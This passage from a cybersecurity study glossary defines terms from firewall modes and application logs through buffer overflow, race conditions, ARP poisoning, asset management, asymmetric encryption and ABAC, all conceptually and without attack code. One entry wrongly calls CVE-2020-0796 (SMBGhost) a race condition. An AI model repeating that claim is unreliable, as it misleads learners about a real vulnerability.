3. Inline (layer 1) - The firewall acts as a cable segment. The two interfaces don't have MAC or IP addresses. Traffic received on one interface is either blocked or forwarded over the other interface. This is also referred to as virtual wire or bump-in-the-wire.
Application and Endpoint Logs - As well as events recorded by the operating system, hosts are also likely to generate application logs (A target for event data relating to a specific software app or package), including logs from host-based security software.

Application Logs
An application log file is simply one that is managed by an application rather than the OS. The application may use Event Viewer or syslog to write event data using a standard format, or it might write log files to its own application directories in whatever format the developer has selected.

In Windows Event Viewer, there is a specific application log, which can be written to by any authenticated account. There are also separate custom application and service logs, which are managed by specific processes. The app developer chooses which log to use or whether to implement a logging system without using Event Viewer. Check the product documentation to find out where events for a particular software app are logged.

Endpoint Logs
An endpoint log (A target for security-related events generated by host-based malware and intrusion detection agents) is likely to refer to events monitored by security software running on the host rather than by the OS itself. This can include host-based firewalls and intrusion detection, vulnerability scanners, and antivirus/antimalware protection suites. Suites that integrate these functions into a single product are often referred to as an endpoint protection platform (EPP), endpoint detection and response (EDR), or extended detection and response (XDR). These security tools can be directly integrated with a SIEM using agent-based software.

Summarizing events from endpoint protection logs can show overall threat levels, such as amount of malware detected, number of host intrusion detection events, and numbers of hosts with missing patches. Close analysis of detection events can assist with attributing intrusion events to a specific actor and developing threat intelligence of tactics, techniques, and procedures.

Vulnerability Scans
While there is usually a summary report, a vulnerability scanner can be configured to log each vulnerability detected to a SIEM. Vulnerabilities can include missing patches and noncompliance with a baseline security configuration. The SIEM will be able to retrieve a list of these logs for each host. Depending on the date of the last scan, it may be difficult to identify from the log data which have been remediated, but in general terms, this will provide useful information about whether a host is properly configured.
Application Attacks - An attack directed against a coding, implementation, or platform vulnerability in OS or application software.

An application attack targets a vulnerability in OS or application software. An application vulnerability is a design flaw that can cause the application security system to be circumvented or that will cause the application to crash. There are broadly two main scenarios for application attacks:

1. Compromising the operating system or third-party apps on a network host by exploiting Trojans, malicious attachments, or browser vulnerabilities. This allows the threat actor to obtain a foothold on a local network.

2. Compromising the security of a website or web application. This allows a threat actor to gain control of a web host, and either steal data from it or use it to try to penetrate further into the network.

Increased numbers of application crashes and errors might provide a general indicator that a threat actor is attempting to exploit a vulnerability in a network service, desktop OS or app, or web application. Errors might be recorded in a system log or application-specific log, depending on the nature of the software and the type of fault event. Anomalous CPU, memory, storage, or network utilization can also be an indicator of application attack. These indicators can also have multiple non-malicious causes, however, so it is important to correlate them to factors that identify specific types of application attacks.

Privilege Escalation
The purpose of most application attacks is to allow the threat actor to run their own code on the system. This is referred to as arbitrary code execution (A vulnerability that allows an attacker to run their own code or a module that exploits such a vulnerability). Where the code is transmitted from one machine to another, it can be referred to as remote code execution. The code would typically be designed to install some sort of backdoor or to disable the system in some way.

An application or process must have privileges to read and write data and execute functions. Depending on how the software is written, a process may run using a system account, the account of the logged-on user, or a nominated account. If a software exploit works, the attacker may be able to execute arbitrary code with the same privilege level as the exploited process. There are two main types of privilege escalation (The practice of exploiting flaws in an operating system or other application to gain a greater level of access than was intended for the user or application):

1. Vertical Privilege Escalation (or elevation) - When an attacker can perform functions that are normally assigned to users in higher roles, and often explicitly denied to the attacker. It is where a user or application can access functionality or data that should not be available to them. For instance, a process might run with local administrator privileges, but a vulnerability allows the arbitrary code to run with higher SYSTEM privileges.

2. Horizontal Privilege Escalation - When a user accesses or modifies specific resources that they are not entitled to. It is where a user accesses functionality or data that is intended for another user. For instance, via a process running with local administrator privileges on a client workstation, the arbitrary code is able to execute as a domain account on an application server.
Without performing detailed analysis of code or process execution in real time, it is privilege escalation that provides the simplest indicator of an application attack. If process logging has been configured, the audit log can provide evidence of privilege escalation attempts. These attempts may also be detected by incident response and endpoint protection agents, which will display an alert.

Buffer Overflow
A buffer is an area of memory that an application reserves to store some value. The application will expect the data to conform to some expected value size or format. To exploit a buffer overflow vulnerability, the attacker passes data that deliberately fills the buffer to its end and then overwrites data at its start. One of the most common vulnerabilities is a stack overflow. The stack is an area of memory used by a program subroutine. It includes a return address, which is the location of the program that called the subroutine. An attacker could use a buffer overflow to change the return address, allowing the attacker to run arbitrary code on the system.

Operating systems use mechanisms such as address space layout randomization (ASLR) and Data Execution Prevention (DEP) to mitigate risks from buffer overflow. Failed attempts at buffer overflow can be identified through frequent process crashes and other anomalies.
Application Logs - A target for event data relating to a specific software app or package.

An application log file is simply one that is managed by an application rather than the OS. The application may use Event Viewer or syslog to write event data using a standard format, or it might write log files to its own application directories in whatever format the developer has selected.

In Windows Event Viewer, there is a specific application log, which can be written to by any authenticated account. There are also separate custom application and service logs, which are managed by specific processes. The app developer chooses which log to use or whether to implement a logging system without using Event Viewer. Check the product documentation to find out where events for a particular software app are logged.
Application Protections - Data exposure (A software vulnerability where an attacker is able to circumvent access controls and retrieve confidential or sensitive data from the file system or database) is a fault that allows privileged information (such as a token, password, or personal data) to be read without being subject to the appropriate access controls. Applications must only transmit such data between authenticated hosts, using cryptography to protect the session. When incorporating encryption in code, it is important to use industry standard encryption libraries that are proven to be strong, rather than internally developed ones.

Error Handling
A well-written application must be able to handle errors and exceptions (An application vulnerability that is defined by how an application responds to unexpected errors that can lead to holes in the security of an app) gracefully. This means that the application performs in a controlled way when something unpredictable happens. An error or exception could be caused by invalid user input, a loss of network connectivity, another server or process failing, and so on. Ideally, the programmer will have written a structured exception handler (SEH - A mechanism to account for unexpected error conditions that might arise during code execution. Effective error handling reduces the chances that a program could be exploited) to dictate what the application should then do. Each procedure can have multiple exception handlers.

Some handlers will deal with anticipated errors and exceptions; there should also be a catchall handler that will deal with the unexpected. The main goal must be for the application not to fail in a way that allows the attacker to execute code or perform some sort of injection attack. One infamous example of a poorly written exception handler is the Apple GoTo bug.

Another issue is that an application's interpreter may default to a standard handler and display default error messages when something goes wrong. These may reveal platform information and the inner workings of code to an attacker. It is better for an application to use custom error handlers so that the developer can choose the amount of information shown when an error is caused.

Technically, an error is a condition that the process cannot recover from, such as the system running out of memory. An exception is a type of error that can be handled by a block of code without the process crashing. Note that exceptions are still described as generating error codes/messages, however.

Memory Management
Many arbitrary code attacks depend on the target application having faulty memory management procedures. This allows the attacker to execute their own code in the space marked out by the target application. There are known unsecure practices for memory management that should be avoided and checks for processing untrusted input, such as strings, to ensure that it cannot overwrite areas of memory.

Client-Side vs. Server- Side Validation
A web application (or any other client-server application) can be designed to perform code execution and input validation locally (on the client) or remotely (on the server). An example of client-side execution is a document object model (DOM) script to render the page using dynamic elements from user input. Applications may use both techniques for different functions. The main issue with client-side validation is that the client will always be more vulnerable to some sort of malware interfering with the validation process. The main issue with server-side validation is that it can be time-consuming, as it may involve multiple transactions between the server and client. Consequently, client-side validation is usually restricted to informing the user that there is some sort of problem with the input before submitting it to the server. Even after passing client-side validation, the input will still undergo server-side validation before it can be posted (accepted). Relying on client-side validation only is poor programming practice.

Application Security in the Cloud
Cloud hardening and application security are complementary capabilities designed to support the shared responsibility model in cloud environments where cloud service providers are responsible for securing the infrastructure and customers are responsible for securing their data and applications. Cloud hardening practices fortify the cloud infrastructure, reducing its attack surface, whereas application security ensures that software is designed, developed, and deployed securely. Together, these approaches create layered defenses that can counter many different types of threats.

Cloud hardening includes least privilege access policies to restrict users to the minimum permissions needed to perform their duties. Encryption protects data in transit and at rest. Regular audits and continuous monitoring practices identify potential security risks, and regular vulnerability assessments and penetration testing detect and address any potential security issues or misconfigurations.

Monitoring Capabilities
Secure coding practices focus primarily on preventing software vulnerabilities but also stress enhancements to logging and monitoring capabilities. These features support security analysts tasked with detecting potential threats and malicious activity in software. Writing code with enhanced monitoring capabilities improves the granularity and effectiveness of logging and alerting systems, which are crucial system monitoring tools.

Implementing comprehensive and meaningful logging requires developers to ensure their applications generate logs that capture important events and activities to support security audits, incident response, and system troubleshooting. Secure coding practices encourage robust error handling to hide or mask sensitive debugging information, and this practice minimizes the risk of attackers exploiting information displayed in error messages. Integrating real-time alerting capabilities within the application code can significantly improve threat detection. For example, code that triggers alerts when specific events occur, such as repeated failed login attempts or unusual data transfers, helps security analysts monitor applications more effectively. These alerts often indicate a potential security breach and provide crucial information for incident response teams.
Application Virtualization - A software delivery model where the code runs on a server and is streamed to a client.

Application virtualization is a more limited type of virtual desktop infrastructure (VDI). Rather than run the whole client desktop as a virtual platform, the client either accesses an application hosted on a server or streams the application from the server to the client for local processing. Most application virtualization solutions are based on Citrix XenApp (formerly MetaFrame Presentation Server), though Microsoft has developed an App-V product with its Windows Server range and VMware has the ThinApp product. These solution types are often used with HTML5 remote desktop apps, referred to as "clientless" because users can access them through ordinary web browser software.
Application Vulnerabilities - 1. Race Condition and TOCTOU
Application race condition (A software vulnerability when the resulting outcome from execution processes is directly dependent on the order and timing of certain events, and those events fail to execute in the order and timing intended by the developer) vulnerabilities refer to software flaws associated with the timing or order of events within a software program, which can be manipulated, causing undesirable or unpredictable outcomes. A race condition describes when two or more operations must execute in the correct order. When software logic does not check or enforce the expected order of events, security issues such as data corruption, unauthorized access, or similar security breaches may occur. Race conditions manifest in a wide variety of ways, such as time-of-check to time-of-use (TOCTOU - The potential vulnerability that occurs when there is a change between when an app checked a resource and when the app used the resource) vulnerabilities, where a system state changes between the check (verification) stage and the use (execution) stage.

Imagine a scenario where a multi-threaded banking application used one program thread to check an account balance and another thread to withdraw money. If an attacker manipulates the sequence of execution in this example, they could potentially overdraw the account. These vulnerabilities underscore the importance of atomic operations where checking and execution are done as a single, indivisible operation, mitigating the likelihood of exploitation.

Two significant examples of race conditions include the Dirty COW Vulnerability (CVE-2016-5195), which is a race condition vulnerability in the Linux Kernel, allowing a local user to gain privileged access, and the Microsoft Windows Elevation of Privilege Vulnerability (CVE-2020-0796), which is a race condition vulnerability associated with the Microsoft Server Message Block 3.1.1 (SMBv3) protocol allowing an attacker to execute arbitrary code on a target SMB server or client. Race conditions are often mitigated by developers through the use of locks, semaphores, and monitors in multi -threaded applications.

2. Memory Injection
Memory injection (A vulnerability that a threat actor can exploit to run malicious code with the same privilege level as the vulnerable process) vulnerabilities refer to a type of security flaw where an attacker can introduce (inject) malicious code into a running application's process memory. An attacker often designs the injected code to alter an application's behavior to provide unauthorized access or control over the system. Injection vulnerabilities are significant because they often lead to severe security breaches. Attackers often use memory injection vulnerabilities to inject code that installs malware, exfiltrates sensitive data, or creates a backdoor for future access. Injected code generally runs with the same level of privileges as the compromised application, which can lead to a full system compromise if the exploited application has high-level permissions. Common memory injection attacks include buffer overflow attacks, format string vulnerabilities, and code injection attacks. These types of attacks are typically mitigated with secure coding practices such as input and output validation, encoding, type-casting, access controls, static and dynamic application testing, and several other techniques.

3. Buffer Overflow
A buffer is an area of memory that the application reserves to store expected data. To exploit a buffer overflow (An attack in which data goes past the boundary of the destination buffer and begins to corrupt adjacent memory. This can allow the attacker to crash the system or execute arbitrary code) vulnerability, the attacker passes data that deliberately overfills the buffer. One of the most common vulnerabilities is a stack overflow. The stack is an area of memory used by a program subroutine. It includes a return address, which is the location of the program that called the subroutine. An attacker could use a buffer overflow to change the return address, allowing the attacker to run arbitrary code on the system.

Buffer overflow attacks are mitigated on modern hardware and operating systems via address space layout randomization (ASLR) and Data Execution Prevention (DEP) controls, utilizing type-safe programming languages (A program that enforces strict type-checking during compilation and ensures variables and data are used correctly. It prevents memory-related vulnerabilities and injection attacks) and incorporating secure coding practices.

4. Malicious Update
A malicious update (A vulnerability in software repository or supply chain that a threat actor can exploit to add malicious code to a package) refers to an update that appears legitimate but contains harmful code, often used by cybercriminals to distribute malware or execute a cyberattack. The update may claim to fix software bugs or offer new features but is instead designed to compromise a system. The significance of such attacks lies in their deceptive nature; users trust and frequently accept software updates, making malicious updates a highly effective infiltration strategy. Malicious updates can be difficult to protect against, but secure software supply chain management, digital signature verification, and other software security practices help mitigate these risks.

In 2017, the legitimate software CCleaner was compromised when an unauthorized update was released containing a malicious payload. This affected millions of users who downloaded the update, believing it was a standard upgrade to improve their system's performance.

Another notable case is the 2020 SolarWinds attack, where attackers used an update to the SolarWinds Orion platform to distribute a malicious backdoor to numerous government and corporate networks, leading to significant data breaches.
Arbitrary Code Execution - A vulnerability that allows an attacker to run their own code or a module that exploits such a vulnerability. The purpose of most application attacks is to allow the threat actor to run their own code on the system. This is referred to as arbitrary code execution.
ARP Poisoning - A network-based attack where an attacker with access to the target local network segment redirects an IP address to the MAC address of a computer that is not the intended recipient. This can be used to perform a variety of attacks, including DoS, spoofing, and on-path (previously known as man-in-the-middle).

An ARP poisoning attack uses a packet crafter, such as Ettercap, to broadcast unsolicited ARP reply packets. Because ARP has no security mechanism, the receiving devices trust this communication and update their MAC:IP address cache table with the spoofed address.
Asset Acquisition / Procurement - Policies and processes that ensure asset and service purchases and contracts are fully managed, secure, use authorized suppliers/vendors, and meet business goals.

From the perspective of supporting cybersecurity operations, asset acquisition/procurement policies are critical in ensuring organizations maintain a robust security posture. Key considerations include selecting hardware and software solutions with strong security features, such as built-in encryption, secure boot mechanisms, and regular updates or patches. It is crucial to work with reputable vendors and manufacturers that prioritize security and provide ongoing support to address potential vulnerabilities in their products.

Additionally, organizations should consider procuring solutions that integrate seamlessly with their existing security infrastructure, such as firewalls, intrusion detection systems, or security information and event management (SIEM) platforms. This facilitates a more cohesive and effective security strategy.

Moreover, organizations should assess the total cost of ownership (TCO) of the assets, considering the initial purchase price along with the ongoing costs of maintenance, updates, and potential security incidents. Prioritizing cybersecurity during the asset acquisition and procurement process helps organizations build a solid foundation for their security operations, reducing the risk of breaches, enhancing compliance with relevant regulations, and ultimately protecting their critical data and systems.
Asset Disposal / Decommissioning - In asset management, the policies and procedures that govern the removal of devices and software from production networks, and their subsequent disposal through sale, donation, or as waste.

Asset disposal/decommissioning concepts focus on the secure and compliant handling of data and storage devices at the end of their lifecycle or when they are no longer needed. Some important concepts include the following:

1. Sanitization - Refers to the process of removing sensitive information from storage media to prevent unauthorized access or data breaches. This process uses specialized techniques, such as data wiping, degaussing, or encryption, to ensure that the data becomes irretrievable. Sanitization is particularly important when repurposing or donating storage devices, as it helps protect the organization's sensitive information and maintains compliance with data protection regulations.

2. Destruction - Involves the physical or electronic elimination of information stored on media, rendering it inaccessible and irrecoverable. Physical destruction methods include shredding, crushing, or incinerating storage devices, while electronic destruction involves overwriting data multiple times or using degaussing techniques to eliminate magnetic fields on storage media. Destruction is a crucial step in the decommissioning process and ensures that sensitive data cannot be retrieved or misused after the disposal of storage devices.

3. Certification - Refers to the documentation and verification of the data sanitization or destruction process. This often involves obtaining a certificate of destruction or sanitization from a reputable third-party provider, attesting that the data has been securely removed or destroyed in accordance with industry standards and regulations. Certification helps organizations maintain compliance with data protection requirements, provides evidence of due diligence, and reduces the risk of legal liabilities. Certifying data destruction without third-party involvement can be challenging, as the latter provides an impartial evaluation.

Files deleted from a magnetic-type hard disk are not fully erased. Instead, the sectors containing the data are marked as available for writing, and the data they contain are only removed as new files are added. Similarly, the standard Windows format tool will only remove references to files and mark all sectors as usable. For this reason, the standard method of sanitizing an HDD is called overwriting. This can be performed using the drive's firmware tools or a utility program. The most basic type of overwriting is called zero filling, which sets each bit to zero. Single pass zero filling can leave patterns that can be read with specialist tools. A more secure method is to overwrite the content with one pass of all zeros, then a pass of all ones, and then a third pass in a pseudorandom pattern. In the past, some federal agencies required the “three pass rule” per the Department of Defense (DoD) manual, but have since moved to National Institute of Standards and Technologies (NIST) SP 800-88 for media sanitization guidelines/procedures. Overwriting can take considerable time, depending on the number of passes required.
Asset Management - The systematic process of developing, operating, maintaining, upgrading, and disposing of assets cost-effectively. Asset management encompasses tracking, classifying, and monitoring physical and digital assets throughout their lifecycle to ensure security, compliance, and optimal resource utilization.
Asset Monitoring / Tracking - Enumeration and inventory processes and software that ensure physical and data assets comply with configuration and performance baselines, and have not been tampered with or suffered other unauthorized access.

An asset management process tracks all the organization's critical systems, components, devices, and other objects of value in an inventory. It also involves collecting and analyzing information about these assets so that personnel can make informed changes or work with assets to achieve business goals.

There are many software suites and associated hardware solutions available for tracking and managing assets. An asset management database can store as much or as little information as necessary. Typical data would be type, model, serial number, asset ID, location, user(s), value, and service information.

We are focusing on technical assets that require some degree of configuration. An organization also has many assets with no configuration requirement, such as furniture and buildings.

Asset Assignment/Accounting and Monitoring/Asset Tracking
Asset ownership assignment/accounting (in asset management, processes that ensure each physical and data asset have an identified owner, and are appropriately tagged and classified within an inventory) and classification are essential components of a well-structured asset management process, ensuring that organizations effectively manage and protect their resources while maintaining accountability.

Assigning asset ownership involves designating specific individuals or teams within the organization as responsible for particular assets to establish a clear chain of accountability for asset security, maintenance, and ongoing management. Asset classification involves organizing assets based on their value, sensitivity, or criticality to the organization. This enables the consistent and repeatable application of required security controls, effective prioritization for maintenance and updates, and appropriate budget allocation. Both processes need periodic reviews to account for changes in asset value, sensitivity, or relevance to business operations.

Monitoring/asset tracking activities include inventory and enumeration tasks, which involve creating and maintaining a comprehensive list of all assets within the organization, such as hardware, software, data, and network equipment. Regularly updating and verifying the asset inventory helps organizations identify and manage their assets effectively, ensuring they have accurate information about each asset's location, owner, and status. This information is vital for license management, patch deployment, and security incident response. Asset monitoring also involves tracking the performance, security, and usage of assets, allowing organizations to detect potential issues, vulnerabilities, or unauthorized access promptly. Proactive asset monitoring helps mitigate risks, optimize resource utilization, and ensure compliance with regulatory requirements.

There are several ways to perform asset enumeration, depending on the size and complexity of the organization and the types of assets involved:

1. Manual Inventory - In smaller organizations or for specific asset types, manually creating and maintaining an inventory of assets may be feasible. This process involves physically inspecting assets, such as computers, servers, and network devices, and recording relevant information, such as serial numbers, make and model, and location.

2. Network Scanning - Network scanning tools, such as Nmap, Nessus, or OpenVAS, can automatically discover and enumerate networked devices, including servers, switches, routers, and workstations. These tools can identify open ports, services, and sometimes even the operating systems and applications running on the devices.

3. Asset Management Software - Asset management software solutions, such as Lansweeper, ManageEngine, or SolarWinds, can automatically discover, track, and catalog various types of assets, including hardware, software, and licenses. These tools often provide a centralized dashboard for managing the asset inventory, monitoring changes, and generating reports.

4. Configuration Management Database (CMDB) - A CMDB is a centralized repository of information related to an organization's IT infrastructure, including assets, configurations, and relationships. Tools like ServiceNow or BMC Remedy can help create and maintain a CMDB, providing a holistic view of the organization's assets and interdependencies.

5. Mobile Device Management (MDM) Solutions - For organizations with a significant number of mobile devices, MDM solutions like Microsoft Intune, VMware Workspace ONE, or MobileIron can help enumerate, manage, and secure smartphones, tablets, and other mobile assets.

6. Cloud Asset Discovery - With organizations increasingly adopting cloud services, cloud-native tools, such as AWS Config or Azure Resource Graph, or third-party solutions like CloudAware or CloudCheckr, can help discover and catalog assets deployed in the cloud.
Asset Ownership Assignment / Accounting - In asset management, processes that ensure each physical and data asset have an identified owner, and are appropriately tagged and classified within an inventory.

Asset ownership assignment/accounting and classification are essential components of a well-structured asset management process, ensuring that organizations effectively manage and protect their resources while maintaining accountability.

Assigning asset ownership involves designating specific individuals or teams within the organization as responsible for particular assets to establish a clear chain of accountability for asset security, maintenance, and ongoing management. Asset classification involves organizing assets based on their value, sensitivity, or criticality to the organization. This enables the consistent and repeatable application of required security controls, effective prioritization for maintenance and updates, and appropriate budget allocation. Both processes need periodic reviews to account for changes in asset value, sensitivity, or relevance to business operations.
Asset Protection - From the perspective of cybersecurity operations, assets describe the critical resources, information, and infrastructure components that must be protected from potential threats and unauthorized access. The term "asset" encompasses resources such as hardware devices, software applications, data repositories, network components, and more. Asset protection is critical to maintaining an organization's information system's integrity, confidentiality, and availability.

Cybersecurity teams are responsible for identifying and prioritizing these assets based on their sensitivity and the potential impact on the organization's core functions if they are lost, stolen, or breached. Actively safeguarding assets minimizes the potential impacts of security breaches and reduces the likelihood of loss or damage.

Asset Identification and Standard Naming Conventions
Tangible assets can be identified using a barcode label or radio frequency ID (RFID) tag attached to the device (or simply using an identification number). An RFID tag is a chip programmed with asset data. When in range of a scanner, the chip activates and signals the scanner. The scanner alerts management software to update the device's location. As well as asset tracking, this allows the management software to track the device's location, making theft more difficult.

A standard naming convention (applying consistent names and labels to assets and digital resources/identities within a configuration management system) makes the environment more consistent for hardware assets and for digital assets such as accounts and virtual machines. The naming strategy should allow administrators to identify the type and function of any particular resource or location at any point in the configuration management database (CMDB) or network directory. Each label should conform to rules for host and DNS names (support.microsoft.com/en-us/help/909264/naming-conventions-in-active-directory-for-computers-domains-sites-and). As well as an ID attribute, the location and function of tangible and digital assets can be recorded using attribute tags and fields or DNS CNAME and TXT resource records.

Configuration management (a process through which an organization's information systems components are kept in a controlled state that meets the organization's requirements, including those for security and compliance) ensures that each configurable element within an asset inventory has not diverged from its approved configuration. Change control (the process by which the need for change is recorded and approved) and change management (the process through which changes to the configuration of information systems are implemented as part of the organization's overall configuration management efforts) reduce the risk that changes to these components could cause an interruption to the organization's operations.

ITIL is a popular documentation framework of good and best practice activities and processes for delivering IT services. Under ITIL, configuration management is implemented using the following elements:

1. Service assets are things, processes, or people that contribute to delivering an IT service.

2. A Configuration Item (CI) is an asset that requires specific management procedures to be used to deliver the service. Each CI must be labeled, ideally using a standard naming convention. CIs are defined by their attributes and relationships stored in a configuration management database (CMDB).

3. A baseline configuration is a list of settings that an asset, such as a server or application, must adhere to. Security baselines describe the minimum set of security configuration settings a device or software must maintain to be considered adequately protected.

4. A configuration management system (CMS) describes the tools and databases used to collect, store, manage, update, and report information about CIs. A small network might capture this information in spreadsheets and diagrams, whereas a large organization may invest in dedicated applications designed for enterprise environments.

Diagrams are the best way to capture the complex relationships between network elements. Diagrams illustrate the use of CIs in business workflows, logical (IP) and physical network topologies, and network rack layouts.
Asymmetric Algorithm - Cipher that uses public and private keys. The keys are mathematically linked, using either Rivest, Shamir, Adleman (RSA) or elliptic curve cryptography (ECC) algorithms, but the private key is not derivable from the public one. An asymmetric key cannot reverse the operation it performs, so the public key cannot decrypt what it has encrypted, for example.
Asymmetric Encryption - Encryption using public and private key pairs where keys are mathematically linked but private key is not derivable from public key.

In a symmetric encryption cipher, the same secret key is used to perform both encryption and decryption operations. With an asymmetric algorithm , encryption and decryption are performed by two different but related public and private keys in a key pair.

When a public key is used to encrypt a message, only the paired private key can decrypt the ciphertext. The public key cannot be used to decrypt the ciphertext. The keys are generated in a way that makes it impossible to derive the private key from the public key. This means that the key pair owner can distribute the public key to anyone they want to receive secure messages from:

1. Bob generates a key pair and keeps the private key secret.

2. Bob publishes the public key. Alice wants to send Bob a confidential message so they take a copy of Bob's public key.

3. Alice uses Bob's public key to encrypt the message.

4. Alice sends the ciphertext to Bob.

5. Bob receives the message and is able to decrypt it using their private key.

6. If Mallory has been snooping, they can intercept both the message and the public key.

7. However, Mallory cannot use the public key to decrypt the message, so the system remains secure.

The drawback of asymmetric encryption is that it involves substantial computing overhead compared to symmetric encryption. Where a large amount of data is being encrypted on disk or transported over a network, asymmetric encryption is inefficient. Rather than being used to encrypt the bulk data directly, the public key cipher can be used to encrypt a symmetric secret key. This allows Alice and Bob to exchange a bulk encryption session key without Mallory being able to learn it.

Asymmetric encryption can be implemented using a number of algorithms. Each algorithm has a different recommended key length. The Rivest, Shamir, Adleman (RSA) asymmetric cipher requires a 2,048-bit private key to achieve an acceptable level of security. The Elliptic Curve Cryptography (ECC) asymmetric cipher can use 256-bit private keys to achieve a level of security equivalent to a 3,072-bit RSA key.
Attack Surface - The total collection of all possible entry points or vulnerabilities that a threat actor could potentially exploit in an environment. This includes hardware, software, network services, APIs, user accounts, and even human factors. A larger attack surface means more potential vulnerabilities; reducing the attack surface (by disabling unnecessary services, closing unused ports, removing unused accounts, etc.) is a key security strategy. The attack surface is all the points at which a malicious threat actor could try to exploit a vulnerability.
Attestation (Cryptography) - Capability of an authenticator or other cryptographic module to prove that it is a root of trust and can provide reliable reporting to prove that a device or computer is a trustworthy platform.

Attestation is a mechanism for an authenticator device, such as a FIDO security key or the TPM in a PC or laptop, to prove that it is a root of trust. Each security key is manufactured with an attestation and model ID. During the registration step, if the relying party requires attestation, the authenticator uses this key to send a report. The relying party can check the attestation report to verify that the authenticator is a known brand and model and supports whatever cryptographic properties the relying party demands.

Note that the attestation key is not unique; if it were unique, it would be easy to identify individuals and be a serious threat to privacy. Instead, it identifies a particular brand and model.
Attestation and Assessments (Governance & Compliance) - Attestation refers to verifying and validating the accuracy, reliability, and effectiveness of security controls, systems, and processes implemented within an organization. It involves an independent and objective examination by a qualified and trusted entity, such as an auditor or assessor. Attestation is a formal declaration or confirmation that an organization's security controls and practices comply with specific standards, regulations, or best practices and provides assurance to stakeholders, such as management, customers, business partners, and regulators, that an organization's security measures are adequate and effective in protecting sensitive information, mitigating risks, and maintaining data confidentiality, integrity, and availability.

Internal and External Assessments
Using internal and external audit and assessment methods is essential for a comprehensive and effective evaluation of an organization's systems, controls, and management processes. The organization's own employees conduct internal audits and provide an in-depth assessment of the organization's business processes. Internal teams can conduct regular, focused assessments that align with the organization's needs and priorities and support continuous monitoring and improvement of internal controls, governance and risk management practices, and operational efficiency.

In contrast, independent third-party service providers conduct external audits and assessments that utilize specialized expertise and knowledge in specific domains, regulations, and industry best practices. External auditors convey an impartial and objective evaluation of business practices that is impossible to obtain using internal teams. External audits ensure that the organization's practices are measured against recognized industry standards and help identify improvement areas that internal audit teams may have missed.

Organizations can achieve several important objectives by utilizing internal and external audit and assessment methods. Using both approaches helps facilitate a balanced and comprehensive view of the organization's risk management practices, controls, and compliance efforts. Combining internal and external audits enhances the organization's risk management capabilities. Internal audits enable continuous monitoring, early detection of issues, and timely remediation, while external audits validate the organization's controls, compliance, and risk mitigation efforts.

Additionally, utilizing both internal and external methods fosters transparency and accountability. Internal audits promote a culture of self-assessment and continuous improvement within the organization, while external audits provide stakeholders with independent assurance and validation of the organization's practices. This combination helps build trust among stakeholders, including customers, business partners, regulatory bodies, and investors. An often overlooked benefit, the collaboration between internal and external auditors facilitates knowledge sharing and professional development, improving the quality of both teams' assessments. Internal auditors can learn from the expertise and best practices of external auditors, while external auditors gain a deeper understanding of the organization's operating environment and the challenges they face that often impede compliance initiatives.

Internal Assessments

1. Compliance Assessment - Internal compliance assessments ensure operating practices align with laws, regulations, standards, policies, and ethical requirements. These assessments evaluate the effectiveness of internal controls, identify noncompliance or risk areas, and communicate findings to stakeholders such as risk managers.

2. Audit Committee - Audit committees provide independent oversight and assurance regarding an organization's financial reporting, internal controls, and risk management practices. These committees are typically composed of board members independent of the organization's management team. Audit committees aim to enhance the integrity of financial statements, ensure compliance with legal and regulatory requirements, monitor the effectiveness of internal controls, oversee the external audit process, and promote transparency and accountability. Audit committees are critical in fostering confidence among shareholders, stakeholders, and the public by providing an independent and objective assessment of the organization's financial practices and contributing to sound corporate governance.

3. Self-Assessment - Self-assessments allow individuals or organizations to evaluate their performance, practices, and adherence to established criteria against predetermined metrics and measures. Self-assessments help identify strengths, weaknesses, and areas for improvement, enabling individuals or organizations to take proactive measures to enhance their effectiveness and outcomes. Self-assessments imply internal personnel with the expertise, knowledge, and understanding of the assessed area are available to complete them.

Internal assessments are required for government agencies according to the NIST RMF, PCI-DSS, and others.

External Assessments

1. Regulatory - Regulatory authorities or agencies perform assessments to ensure compliance with specific laws, regulations, or industry standards. Regulatory assessments evaluate whether organizations adhere to mandatory regulatory requirements and promote a culture of compliance. Regulatory assessments typically involve inspections, audits, or reviews of processes, practices, and controls to verify compliance, identify deficiencies, and enforce regulatory obligations. Regulatory assessments play a critical role in safeguarding public interests, protecting consumers, maintaining market integrity, and upholding industry standards. They help mitigate risks, ensure fair competition, and enhance transparency and accountability in regulated industries.

2. Examination - An external examination typically refers to an independent and formal evaluation conducted by external parties, such as auditors or regulators, to assess the accuracy, reliability, and compliance of an organization's financial statements, processes, controls, or specific aspects of its operations. External examinations focus on verifying information accuracy and ensuring compliance with applicable laws, regulations, or industry standards. Examples of external examinations include financial statement audits, regulatory compliance audits, and specific assessments of control environments.

3. Assessment - An external assessment generally refers to a broad evaluation conducted by external experts or consultants to assess an organization's overall performance, practices, capabilities, or specific focus areas. External assessments can encompass various elements, such as strategy, operational efficiency, risk management, cybersecurity, or compliance practices. The goal is to provide an objective and independent perspective on the organization's strengths, weaknesses, and opportunities for improvement.

4. Independent Third-Party Audit - Independent third-party audits provide objective and unbiased assessments of an organization's systems, controls, processes, and compliance. The importance of independent third-party audits lies in their ability to offer an external perspective, free from any conflicts of interest or bias. Independent audits instill confidence among stakeholders, including customers, business partners, regulatory bodies, and investors, as they attest to an organization's commitment to quality, compliance, and good governance. They also help organizations demonstrate transparency, accountability, and adherence to industry standards and regulations.

External entities could include certified public accountants (CPAs), external auditors, consulting firms, regulatory bodies, or specialized assessment agencies. The independence of these external assessors ensures impartiality and objectivity in the evaluation process.
Attribute-based Access Control (ABAC) - An access control technique that evaluates a set of attributes that each subject possesses to determine if access should be granted.

Attribute-based access control (ABAC) is the most fine-grained type of access control model. As the name suggests, an ABAC system makes access decisions based on a combination of subject and object attributes plus any context-sensitive or system-wide attributes. As well as group/role memberships, these attributes could include information about the OS currently being used, the IP address, or the presence of up-to-date patches and antimalware. For example, an attribute-based system can account for the different authentication and group membership limitations found in networked storage solutions such as NFS in Unix/Linux environments. An attribute-based system monitors the number of events or alerts associated with a user account or with a resource, or tracks access requests to ensure they are consistent in terms of timing or geographic location. It can be programmed to implement policies such as M-of-N control and separation of duties. M-of-N control is a security measure that requires a minimum number (M) of agents out of a total number (N) to work together to perform a high-level security task, such as key signing.
Attributes of Threat Actors - Characteristics used to classify and understand threat actors, including their access level (internal/external), technical sophistication and capability, and available resources/funding. Understanding these attributes helps security professionals assess the threat landscape and implement appropriate defenses.
Auditing (Vulnerability Assessment) - An audit process with a wide scope, including assessment of supply chain, configuration, support, monitoring, and cybersecurity factors.

